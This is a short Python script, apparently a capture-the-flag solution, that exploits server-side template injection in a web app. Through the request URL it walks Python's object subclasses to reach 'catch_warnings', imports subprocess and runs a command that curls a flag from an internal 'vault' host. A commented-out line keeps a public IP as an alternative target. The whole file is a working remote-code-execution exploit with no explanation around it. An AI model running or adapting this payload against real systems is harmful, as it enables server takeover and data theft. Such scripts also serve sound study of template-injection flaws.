#!/usr/bin/env python
import urlparse
import requests


# URL = 'http://35.185.193.194'
URL = 'http://localhost:8099'
def main():
    q = '{{().__class__.__bases__[0].__subclasses__()[%s]}}'

    for x in range(312):
        text = requests.get(urlparse.urljoin(URL, q % x)).text
        if 'catch_warnings' in text.lower():
            break

    command = '["curl", "http://vault:8080/flag"]'
    q = '{{().__class__.__bases__[0].__subclasses__()[%s]()._module.__builtins__.__import__("subprocess").check_output(%s)}}' % (x, command)
    print requests.get(urlparse.urljoin(URL, q)).text

if __name__ == '__main__':
    main()
